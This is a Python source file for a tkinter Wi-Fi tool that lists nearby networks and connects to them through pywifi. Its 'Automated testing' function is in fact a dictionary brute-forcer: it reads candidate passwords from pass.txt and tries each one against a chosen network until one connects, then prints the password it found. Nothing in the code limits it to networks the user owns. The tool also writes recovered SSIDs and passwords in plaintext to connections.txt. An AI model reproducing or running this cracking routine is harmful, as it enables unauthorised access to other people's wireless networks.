import tkinter as tk
from tkinter import ttk
import pywifi
import time
from io import StringIO
import os
import sys


class WifiToolGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Chandu")
        self.master.resizable(False, False)
        #self.master.configure(bg='#393E40')

        
        self.terminal_text = tk.Text(master, height=15, width=50, bg='black', fg='green')
        self.terminal_text.grid(row=0, column=2, rowspan=5, padx=10, pady=10)
        
        # Display initial message in the terminal (Dog face ASCII art)
        initial_message = r"""
 / \__
(    @\___
 /         O
/   (_____/
/_____/  U
"""
        self.terminal_text.insert(tk.END, initial_message)
        self.terminal_text.see(tk.END)


        self.ssid_label = ttk.Label(master, text="Available WiFi Networks:")
        self.ssid_label.grid(row=0, column=0, columnspan=2, pady=10)

        self.ssid_listbox = tk.Listbox(master, selectmode=tk.SINGLE)
        self.ssid_listbox.grid(row=1, column=0, columnspan=2, pady=10)

        self.refresh_button = ttk.Button(master, text="Refresh", command=self.list_wifi)
        self.refresh_button.grid(row=0, column=2, padx=10, pady=10)

        self.connect_button = ttk.Button(master, text="Connect", command=self.connect_with_password)
        self.connect_button.grid(row=4, column=1, pady=10)

        self.test_button = ttk.Button(master, text="Automated testing", command=self.automated_testing)
        self.test_button.grid(row=2, column=1, pady=10)

        self.password_entry_label = ttk.Label(master, text="Enter the WiFi password:")
        self.password_entry_label.grid(row=3, column=0, pady=10)

        self.password_entry = ttk.Entry(master, show="*")
        self.password_entry.grid(row=3, column=1, pady=10)

        # Move these buttons to the right for better appearance
        self.connect_automatically_button = ttk.Button(master, text="Check Saved", command=self.connect_automatically)
        self.connect_automatically_button.grid(row=2, column=0, pady=10)

        self.clear_terminal_button = ttk.Button(master, text="Clear Terminal", command=self.clear_terminal)
        self.clear_terminal_button.grid(row=4, column=2, pady=10)

        # Initialize PyWiFi instance
        self.wifi = pywifi.PyWiFi()
        # Assuming the first interface, change accordingly
        self.iface = self.wifi.interfaces()[0]

        # Populate SSID list
        self.list_wifi()

    def list_wifi(self):
        # Clear previous items in the listbox
        self.ssid_listbox.delete(0, tk.END)

        scan_results = self.iface.scan_results()
        unique_ssids = set(result.ssid for result in scan_results)
        for ssid in unique_ssids:
            self.ssid_listbox.insert(tk.END, ssid)

    def connect_with_password(self):
        selected_index = self.ssid_listbox.curselection()
        if selected_index:
            ssid = self.ssid_listbox.get(selected_index)
            password = self.password_entry.get()
            self.connect_wifi(ssid, password)







    def automated_testing(self):
        selected_index = self.ssid_listbox.curselection()
        if selected_index:
            ssid = self.ssid_listbox.get(selected_index)
            self.automated_testing_logic(ssid)

    def connect_automatically(self):
        selected_index = self.ssid_listbox.curselection()
        if selected_index:
            ssid = self.ssid_listbox.get(selected_index)
            self.connect_automatically_logic(ssid)



    # ... (previous code)

    def connect_wifi(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)

        time.sleep(5)  # Wait for the connection to establish

        if self.iface.status() == pywifi.const.IFACE_CONNECTED:
            message = f"Connected to {ssid}\n"
            print(message)
            self.display_in_terminal(message)
            self.record_connection(ssid, password)
            return "Connected"
        else:
            message = "Connection failed\n"
            print(message)
            self.display_in_terminal(message)
            return "Failed"



# ... (rest of the code)
        
    def get_file_path(self, filename):
        if hasattr(sys, '_MEIPASS'):
        # Running as a PyInstaller one-file executable
            base_path = sys._MEIPASS
        else:
        # Running as a regular Python script
            base_path = os.path.abspath(os.path.dirname(__file__))

        return os.path.join(base_path, filename)




    def automated_testing_logic(self, ssid):
            # Dynamically get the path to abc.txt
            abc_file_path = self.get_file_path('pass.txt')

            password_list = []

            # Read passwords from abc.txt
            try:
                with open(abc_file_path, 'r') as file:
                    password_list = [line.strip() for line in file]
            except FileNotFoundError:
                self.display_in_terminal("File Not Found\n")
                return None

            password_found = False
            index = 0

            while not password_found and index < len(password_list):
                password = password_list[index]

                message = f"Trying password: {password}\n"
                print(message)
                self.display_in_terminal(message)

                result = self.connect_wifi(ssid, password)
                if result == "Connected":
                    message = f"Correct password found: {password}\n"
                    print(message)
                    self.display_in_terminal(message)
                    password_found = True
                else:
                    index += 1


    def connect_automatically_logic(self, ssid):
        # Check if the SSID is in the saved connections
        with open('connections.txt', 'r') as file:
            for line in file:
                if f"SSID: {ssid}" in line:
                    parts = line.split(", Password: ")
                    saved_password = parts[1].strip()
                    message = f'Connecting to {ssid} using saved password.\n'
                    print(message)
                    self.display_in_terminal(message)
                    self.connect_wifi(ssid, saved_password)
                    return
            message = f"SSID: {ssid} not found in saved connections.\n"
            print(message)
            self.display_in_terminal(message)

    def record_connection(self, ssid, password):
        with open('connections.txt', 'r') as file:
            # Read existing lines to check for duplicates
            existing_lines = file.readlines()

        # Check if the combination already exists
        if f"SSID: {ssid}, Password: {password}\n" not in existing_lines:
            with open('connections.txt', 'a') as file:
                # Write the new combination
                file.write(f"SSID: {ssid}, Password: {password}\n")



    def display_in_terminal(self, message):
        self.terminal_text.insert(tk.END, message)
        self.terminal_text.see(tk.END)
        self.master.update_idletasks()

    def clear_terminal(self):
        self.terminal_text.delete(1.0, tk.END)

def main():
    root = tk.Tk()
    app = WifiToolGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
